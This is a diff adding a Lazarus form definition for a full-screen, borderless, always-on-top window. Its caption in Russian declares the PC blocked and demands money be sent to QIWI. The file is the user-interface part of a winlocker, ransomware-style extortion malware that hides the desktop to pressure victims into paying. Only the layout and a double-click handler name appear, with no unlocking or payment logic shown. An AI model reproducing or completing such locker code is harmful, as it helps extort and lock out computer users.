@@ -1,0 +1,45 @@
+object Form2: TForm2
+  Cursor = crNo
+  Left = 751
+  Height = 240
+  Top = 179
+  Width = 320
+  Align = alClient
+  AlphaBlend = True
+  AlphaBlendValue = 195
+  Anchors = [akLeft, akRight]
+  AutoSize = True
+  BorderIcons = []
+  BorderStyle = bsNone
+  Caption = 'Form2'
+  ClientHeight = 240
+  ClientWidth = 320
+  Color = 16014953
+  DefaultMonitor = dmDesktop
+  FormStyle = fsSystemStayOnTop
+  OnDblClick = Label1DblClick
+  Position = poScreenCenter
+  LCLVersion = '1.2.0.3'
+  WindowState = wsMaximized
+  object Label1: TLabel
+    AnchorSideRight.Side = asrBottom
+    Cursor = crNo
+    Left = 0
+    Height = 150
+    Top = 24
+    Width = 320
+    Alignment = taCenter
+    Anchors = [akLeft, akRight]
+    AutoSize = False
+    Caption = 'ПК заблокирован! Скиньте деньги на QIWI'
+    Color = 12967017
+    Font.Height = -24
+    Font.Style = [fsBold]
+    Layout = tlCenter
+    ParentColor = False
+    ParentFont = False
+    Transparent = False
+    WordWrap = True
+    OnDblClick = Label1DblClick
+  end
+end
